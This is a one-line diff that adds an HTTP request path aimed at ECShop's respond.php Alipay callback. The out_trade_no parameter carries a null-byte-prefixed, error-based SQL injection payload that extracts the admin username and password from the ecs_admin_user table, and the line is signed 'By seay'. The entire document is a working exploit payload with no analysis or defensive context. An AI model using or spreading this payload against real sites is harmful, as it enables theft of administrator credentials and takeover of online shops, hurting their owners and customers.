@@ -1,0 +1,1 @@
+/ecshop/respond.php?code=alipay&subject=0&out_trade_no=%00' and (select * from (select count(*),concat(floor(rand(0)*2),(select concat(user_name,password) from ecs_admin_user limit 1))a from information_schema.tables group by a)b) -- By seay
